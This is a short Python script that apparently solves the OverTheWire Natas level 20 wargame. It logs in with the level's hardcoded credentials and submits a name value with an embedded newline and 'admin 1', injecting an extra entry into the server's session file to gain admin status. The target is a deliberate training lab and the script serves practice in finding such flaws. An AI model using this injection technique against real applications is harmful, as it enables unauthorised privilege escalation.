#!/bin/python
import requests,re

username = "natas20"
pwd = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"
url = f"http://{username}.natas.labs.overthewire.org/?debug=True"
data={'name':'ag\nadmin 1'}
session = requests.Session()

response= session.post(url,data=data,auth=(username,pwd))

response= session.get(url,auth=(username,pwd),data=data)
con=response.text
print(con)